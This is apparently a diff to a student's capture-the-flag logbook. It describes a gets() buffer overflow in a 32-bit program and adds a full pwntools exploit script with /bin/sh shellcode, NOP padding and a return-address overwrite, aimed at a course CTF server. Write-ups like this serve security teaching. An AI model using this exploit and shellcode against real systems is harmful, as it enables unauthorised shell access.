@@ -83,5 +83,62 @@
     - PIE enabled
     - No RPATH
     - No RUNPATH
-- The line 12 of the code has a vulnerability, since the function *gets* keeps reading the input until it founds a newline/EOF character, independentely of the size of the variable where the program stores that input.
-- 
+- The line 12 of the code has a vulnerability, since the function *gets* keeps reading the input until it founds a newline/EOF character, independentely of the size of the variable where the program stores that input. So, by introducing an input larger than the buffer size (which in this case is 100 bytes), it continues writing past the end and into memory it doesn't own.
+- We must fill the buffer with the shellcode that allows us to get access to the shell. We used the shellcode given in the Buffer Overflow Lab (LOGBOOK 5), for 32 bit system.
+- We also used the Python scripts given in that lab, adjusting the values to this new problem.
+- First, we tested the exploit locally, using the executable `program`.
+- The buffer address is printed as soon as we run the executable, and we must get its value in runtime, since it changes everytime the program runs.
+- To achieve that, we used the function recvuntil() that reads bytes from the console, to isolate the address value.
+- Then, we needed to convert this value to a string, and then to heximal using the funtion int() with the second argument as 16, which is the base.
+- We set the offset to 108, which is the number of positions after the buffer address where the return address is located. We found this number using gdb to dump the memory.
+- Finally, using the funtion sendline(), we are able to send the buffer with the shellcode to the process.
+- After success on the local experiment, we use the function remote() to connect to the server where the exploit will be applied, and we obtain the flag for this challenge.
+- The final version of the Python  script used is the following:
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('ctf-fsi.fe.up.pt', 4001)
+
+
+### Falta o encoding?
+a=r.recvuntil(b" is ")
+a=r.recvuntil(b".", drop=True)
+a=a.decode('utf-8')
+a=int(a, 16)
+print(a)
+
+
+shellcode= (
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+"\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP’s
+content = bytearray(0x90 for i in range(200))
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 0 # ✩ Need to change ✩
+content[start:start + len(shellcode)] = shellcode
+# Decide the return address value
+# and put it somewhere in the payload
+ret = a # ✩ Need to change ✩
+
+
+offset = 108 # ✩ Need to change ✩
+L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+
+r.sendline(content)
+r.interactive()
+##################################################################
+```
+- Submit 2nd flag
